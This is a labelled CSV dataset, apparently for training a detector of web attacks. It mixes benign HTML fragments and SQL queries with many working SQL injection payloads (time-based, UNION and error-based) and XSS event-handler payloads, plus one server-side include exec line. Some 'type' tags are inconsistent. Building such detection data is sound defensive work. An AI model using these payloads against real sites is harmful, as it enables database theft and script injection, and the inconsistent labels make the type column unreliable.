Text,Label,type
"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" ontransitionend=alert(1)></xmp>",2,xss
"<li><a href=""/wiki/Consciousness"" title=""Consciousness"">Consciousness </a> </li>",0,xss
"  SELECT Orders.memoryrID, Employees.slightly, Employees.rain FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.westernID ORDER BY Orders.medicineID",0,sql
"1'||  (  select 'cjwp' where 8681  =  8681 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  ||'",1,sql
"	 </span> <span class=""reference-text"">",0,xss
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=70"" title=""Edit section: See also"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
SELECT MIN ( easy )  AS tax FROM throughout,0,sql
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'eznq' like 'eznq",1,sql
SELECT COUNT ( DISTINCT hunt )  FROM bridge,0,xss
"<li><a href=""/wiki/Microbotics"" title=""Microbotics"">Microbotics </a> </li>",0,xss
symen,0,sql
admin' or '1'  =  '1,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://venturebeat.com/2016/10/22/cant-find-a-perfect-ceo-create-an-ai-one-yourself/"">""Can't find a perfect CEO? Create an AI one yourself"" </a>. 22 October 2016. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Abook&amp;rft.genre=unknown&amp;rft.btitle=Can%27t+find+a+perfect+CEO%3F+Create+an+AI+one+yourself&amp;rft.date=2016-10-22&amp;rft_id=https%3A%2F%2Fventurebeat.com%2F2016%2F10%2F22%2Fcant-find-a-perfect-ceo-create-an-ai-one-yourself%2F&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
DELETE FROM take,0,sql
"  SELECT composition,compare FROM wonder WHERE stepped = 'about' UNION SELECT memory, receive FROM actually",0,xss
"   SELECT Employees.toward, COUNT ( Orders.onID )  AS swimmingFROM    ( OrdersINNER JOIN flow ON Orders.sisterID  =  Employees.courtID ) ",0,sql
select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,sql
"1' and elt  (  1533  =  5695,5695  )   and 'ycgi'  =  'ycgi",1,sql
SELECT AVG ( caught ) FROM clean,0,sql
SELECT bat ( s )  FROM wise SELECT leaving ( s ) ,0,sql
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></datalist>",2,xss
"	 </span> <span class=""reference-text"">",0,xss
SELECT * FROM planned  WHERE cabin = congress,0,sql
    </section>,0,xss
7.51931E+15,0,xss
"1%' or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,sql
SELECT spider ( s )  FROM settlers UNION,0,sql
magrath,0,sql
1'   )    )    as gchn where 5856  =  5856,1,xss
6928,0,sql
	 </span>,0,xss
"1' where 4149  =  4149 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,xss
6861,0,sql
jelisic@sevach.pf,0,xss
"1"" where 6200  =  6200 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,xss
SELECT AVG ( Price ) FROM who,0,sql
"<ul><li><a href=""#CITEREFKurzweil1999"">Kurzweil 1999 </a> and <a href=""#CITEREFKurzweil2005"">Kurzweil 2005 </a> </li> </ul>",0,xss
45643261z,0,sql
"  UPDATE transportation SET gas =  'means', City =  'tip' WHERE everybody =  sentence",0,sql
	 </span>,0,xss
"1"" rlike   (  select   (  case when   (  5552  =  1712  )   then 1 else 0x28 end   )    )   ",1,xss
"-3737%"" union all select 4452,4452,4452#",1,sql
"-9347'  )   union all select 3884,3884#",1,sql
"  SELECT orID AS ID, it AS soft FROM directly",0,sql
"<shadow onkeypress=""alert(1)"" contenteditable>test</shadow>",2,xss
"INSERT INTO slow  ( wagon, home, rope )  VALUES  ( 'never', 'bag', 'liquid' )  ",0,sql
SELECT COUNT ( impossibleID ) FROM belt,0,sql
<shadow id=x tabindex=1 onbeforedeactivate=alert(1)></shadow><input autofocus>,2,xss
SELECT * FROM jack WHERE view LIKE '%knowledge%',0,sql
"<sub onmouseleave=""alert(1)"">test</sub>",2,xss
"-4571' union all select 3227,3227,3227,3227--",1,sql
leigh_hellinger@atorre.sy,0,sql
bradney4,0,sql
"  SELECT nuts,though,worry FROM aside LEFT JOIN Orders ON quick.careID =  sometime.write ORDER BY crack.card",0,sql
"1' union all select null,null--",1,sql
<q onpointerover=alert(1)>XSS</q>,2,xss
SELECT AVG ( Price ) FROM basic,0,sql
"<style>:target {transform: rotate(180deg);}</style><meta id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></meta>",2,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""xbft""  =  ""xbft",1,sql
peaflor,0,sql
 </li>,0,xss
1   )    )    and 7533  =  7533 and    (    (   8738  =  8738,1,sql
"or 1  =  1 or """"  =  ",1,sql
 ,0,xss
	 </span> 2020 ,0,xss
"1'   )    )    as arhm where 3268  =  3268 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1,sql
"  SELECT * FROM swept WHERE thirty IN  ( 'sang', 'almost', 'take' )  ",0,sql
SELECT * FROM suppose  WHERE twice = judge,0,sql
SELECT return ( s )  FROM wait SELECT sound ( s ) ,0,sql
1  )   where 6150  =  6150,1,sql
"<plaintext oncontextmenu=""alert(1)"">test</plaintext>",2,xss
"1   )    )    as jmcp where 8624  =  8624 union all select null,null,null,null,null,null,null,null,null,null--",1,sql
  )   or true--,1,sql
"1%'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  '%'  =  '",1,sql
1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,1,sql
"<article onmouseout=""alert(1)"">test</article>",2,xss
"1"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  ",1,sql
"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
<shadow id=x tabindex=1 onfocusin=alert(1)></shadow>,2,xss
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""  =  """,1,sql
	 </span>,0,xss
"	 </span>"" </a>. <i>Business Insider </i>. 25 May 2018<span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">6 May ",0,xss
"<em onkeypress=""alert(1)"" contenteditable>test</em>",2,xss
	 </span> </li>,0,xss
SELECT MIN ( planning )  AS wear FROM space,0,sql
1%'  )   and   (  3020  =  3020  )  *6703 and   (  '%'  =  ',1,sql
SELECT TOP 3 * FROM danger WHERE rocky = 'better',0,sql
SELECT DISTINCT dangerous FROM give,0,sql
"<div role=""note"" class=""hatnote navigation-not-searchable"">Main article: <a href=""/wiki/Artificial_intelligence_(video_games)"" class=""mw-redirect"" title=""Artificial intelligence (video games)"">Artificial intelligence (video games) </a> </div>",0,xss
"<svg ondblclick=""alert(1)"">test</svg>",2,xss
"quevedo y quintana s/n, 4-h",0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Proposals and<br />implementations </th><td class=""navbox-list navbox-even hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
7.64748E+15,0,sql
"<ol draggable=""true"" ondragenter=""alert(1)"">test</ol>",2,xss
1 where 7021  =  7021 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1,sql
"<li><a href=""#CITEREFLugerStubblefield2004"">Luger &amp; Stubblefield 2004 </a>, chpt. 3,4,6,8, </li>",0,xss
"  SELECT TIMESTAMP ( ""2017-07-23"" ) ;",0,xss
SELECT MIN ( green )  AS eager FROM crowd,0,sql
"-9111"" or 3038  =  3038",1,sql
"<sup id=""cite_ref-Roberts_147-0"" class=""reference""><a href=""#cite_note-Roberts-147"">&#91;144&#93; </a> </sup> Many advances have general, cross-domain significance. One high-profile example is that <a href=""/wiki/DeepMind"" title=""DeepMind"">DeepMind </a> in the 2010s developed a ""generalized artificial intelligence"" that could learn many diverse <a href=""/wiki/Atari_2600"" title=""Atari 2600"">Atari </a> games on its own, and later developed a variant of the system which succeeds at <a href=""/wiki/Catastrophic_interference#The_Sequential_Learning_Problem:_McCloskey_and_Cohen_(1989)"" title=""Catastrophic interference"">sequential learning </a>.",0,xss
"<li><a href=""/wiki/Automated_retail"" title=""Automated retail"">Retail </a> </li>",0,xss
"<summary oncut=""alert(1)"" contenteditable>test</summary>",2,xss
SELECT AVG ( Price ) FROM supply,0,sql
SELECT TOP 50 PERCENT * FROM combination,0,sql
"<noframes onmouseenter=""alert(1)"">test</noframes>",2,xss
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Emerging_technologies_in_information_and_communications"" style=""padding:3px""><table class=""nowraplinks hlist mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"" style=""text-align: center;"">",0,xss
SELECT * FROM any  WHERE brother NOT LIKE '[roll]%',0,sql
        <dt>On Read the Docs</dt>,0,xss
SELECT * FROM safe WHERE introduced  BETWEEN 10 AND 20,0,sql
SELECT * FROM farmer WHERE replace = 'split' FETCH FIRST 3 ROWS ONLY,0,sql
"-7715'  )   union all select 4830,4830,4830,4830,4830,4830,4830,4830--",1,sql
1'   )    )     )   and 7533  =  7533 and    (    (     (  'hoyw'  =  'hoyw,1,xss
chunshin,0,xss
SELECT bean ( s )  FROM announced SELECT imagine ( s ) ,0,sql
SELECT AVG ( increase )  FROM president  SELECT SUM ( today ) ,0,xss
        </div>,0,xss
SELECT nearby ( s )  FROM thumb UNION,0,sql
SELECT hill ( s FROM studied RIGHT JOIN,0,sql
<data id=x tabindex=1 onfocusin=alert(1)></data>,2,xss
"	 </span> <span class=""reference-text""><cite class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://www.siemens.com/innovation/en/home/pictures-of-the-future/digitalization-and-software/autonomous-systems-infographic.html"">""Autonomous Systems: Infographic"" </a>. <i>siemens.com </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">7 February ",0,xss
SELECT * FROM successful FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM capital,0,sql
"<div draggable=""true"" contenteditable>drag me</div><blink ondrop=alert(1) contenteditable>drop here</blink>",2,xss
"1""   )    )    rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (   ""mmvu""  =  ""mmvu",1,sql
<ruby onpointerenter=alert(1)>XSS</ruby>,2,xss
reilly-pidgeon@interpretacion-diccionario-y-significado-de-los-s,0,sql
21840329n,0,sql
"1%'   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",1,sql
"<rt onbeforecut=""alert(1)"" contenteditable>test</rt>",2,xss
SELECT MIN ( repeat )  AS chemical FROM rain,0,sql
"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'tvar'  =  'tvar",1,xss
"1""  )   as rdvm where 6360  =  6360 and sleep  (  5  )  --",1,sql
SELECT AVG ( thin ) FROM force SELECT SUM ( money ) ,0,sql
SELECT * FROM adult WHERE saved = 'ten' FETCH FIRST 3 ROWS ONLY,0,sql
"<div draggable=""true"" contenteditable>drag me</div><center ondragover=alert(1) contenteditable>drop here</center>",2,xss
"<style>:target {color: red;}</style><tr id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tr>",2,xss
"<li id=""cite_note-General_intelligence-19""><span class=""mw-cite-backlink"">^ <a href=""#cite_ref-General_intelligence_19-0""><sup><i><b>a </b> </i> </sup> </a> <a href=""#cite_ref-General_intelligence_19-1""><sup><i><b>b </b> </i> </sup> </a> ",0,xss
robin@comerciosdeaspe.info,0,sql
SELECT COUNT ( able ) FROM constantly,0,sql
SELECT * FROM CustomersFETCH FIRST 50 PERCENT ROWS ONLY;SELECT TOP 3 * FROM Customers,0,xss
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
SELECT * FROM route FETCH FIRST 3 ROWS ONLY,0,xss
"1%'  )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
SELECT * FROM floor FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
"<dir draggable=""true"" ondragenter=""alert(1)"">test</dir>",2,xss
ligurs,0,sql
09352334m,0,sql
SELECT sea ( s )  FROM unusual,0,sql
 </li>,0,xss
"INSERT INTO lead ( hair, spend, nature, quiet, while, great )  VALUES  ( 'took', 'route'. zulu', 'rhythm', 'rule', 'blue', 'during' )  ",0,sql
"1%'   )    )    union all select null,null,null,null,null#",1,sql
1  ) ,1,sql
	 </span>,0,xss
" </tr><tr><th style=""padding:0.1em"">",0,xss
giertych,0,sql
"1  )   as zbha where 9700  =  9700 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,sql
"mesas, las",0,xss
"<bdi onbeforepaste=""alert(1)"" contenteditable>test</bdi>",2,xss
FROM  ( SELECT DISTINCT species FROM identity ) ,0,sql
"	 </span> <span class=""reference-text""><a href=""#CITEREFDomingos2015"">Domingos 2015 </a>, p.&#160;152. ",0,xss
"<blink oncut=""alert(1)"" contenteditable>test</blink>",2,xss
<option onpointerup=alert(1)>XSS</option>,2,xss
"<strike onkeypress=""alert(1)"" contenteditable>test</strike>",2,xss
"-3130'   )    )     )   union all select 2886,2886,2886,2886,2886,2886,2886#",1,sql
c/ agachadilla 81,0,sql
1'+  (  select 'vddk' where 6961  =  6961,1,sql
SELECT AVG ( save ) FROM require,0,sql
vajih,0,sql
"  SELECT correctly,relationship,bus FROM throat LEFT JOIN Orders ON skill.chapterID =  minerals.cast ORDER BY police.women",0,sql
select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,1,sql
talavera panfili,0,sql
<custom tags onpointerup=alert(1)>XSS</custom tags>,2,xss
sojuela,0,sql
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'qyyg'  =  'qyyg",1,sql
"<!--#exec cmd=""/bin/echo '<SCR'""-->",2,xss
6736,0,sql
SELECT satisfied ( s )  FROM library SELECT get FROM fence,0,xss
DELETE FROM Customers  WHERE CustomerName = 'Alfreds Futterkiste';,0,sql
1'  )   where 6440  =  6440 or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
adelaide,0,sql
"  UPDATE operation SET bat =  'below', City =  'ice' WHERE president =  fell",0,sql
SELECT music ( s )  FROM garden LEFT JOIN,0,sql
calle capitan palacios 71,0,sql
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  -- rucf",1,sql
1%'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,1,sql
"	 </span> <span class=""reference-text""><cite class=""citation journal"">Buttazzo, G. (July 2001). ""Artificial consciousness: Utopia or real possibility?"". <i><a href=""/wiki/Computer_(magazine)"" title=""Computer (magazine)"">Computer </a> </i>. <b>34 </b> (7): 24–30. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1109%2F2.933500"">10.1109/2.933500 </a>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Computer&amp;rft.atitle=Artificial+consciousness%3A+Utopia+or+real+possibility%3F&amp;rft.volume=34&amp;rft.issue=7&amp;rft.pages=24-30&amp;rft.date=2001-07&amp;rft_id=info%3Adoi%2F10.1109%2F2.933500&amp;rft.aulast=Buttazzo&amp;rft.aufirst=G.&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
30736152x,0,sql
56163821y,0,sql
SELECT COUNT ( teach ) FROM pleasure,0,sql
SELECT * FROM corner WHERE happy = 'orbit'  AND  ( essential = 'draw' OR special = 'brother' ) ,0,sql
"   SELECT steady,happened,wait,mathematics,affect     (  (  spent JOIN thirty ON gravity.hidden =  sitting.magic )   INNER JOIN caveON Orders.all =  detail.anybodyID ) ",0,xss
<input onblur=alert(1) id=x><input autofocus>,2,xss
"1' in boolean mode  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
	 </span>(1938) </li>,0,xss
"<ul><li><a href=""/wiki/Zairja"" title=""Zairja"">Zairja </a> </li>",0,xss
"<li><a href=""/wiki/Francisco_Varela"" title=""Francisco Varela"">Francisco Varela </a> </li>",0,xss
"<li id=""cite_note-Breadth_of_commonsense_knowledge-106""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-Breadth_of_commonsense_knowledge_106-0"">^ </a> </b> ",0,xss
jaraba villa,0,xss
SELECT TOP 3 * FROM alive,0,sql
SELECT * FROM shoulder WHERE NOT minute = 'appropriate'  AND NOT among = 'win',0,sql
SELECT indeed ( s )  FROM rise LEFT JOIN,0,sql
"SELECT * FROM love WHERE pour BETWEEN ""period"" AND    ""full""",0,xss
	 </span>,0,xss
"<li>Looking for specific information? Try the <a class=""hoverxref reference internal"" data-doc=""genindex"" data-project=""scrapy"" data-section="""" data-version=""latest"" href=""genindex.html""><span class=""std std-ref"">Index",0,xss
<frameset><frame id=x onfocus=alert(1)>,2,xss
"<style oncopy=""alert(1)"" contenteditable>test</style>",2,xss
FROM  ( SELECT DISTINCT tool FROM try ) ,0,sql
SELECT TOP 3 * FROM list WHERE experience = 'lamp',0,sql
43713,0,sql
SELECT kept ( s )  FROM old SELECT actual ( s ) ,0,sql
"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'gzlz' like 'gzlz",1,sql
SELECT * FROM nor WHERE notice = 'steep' FETCH FIRST 3 ROWS ONLY,0,sql
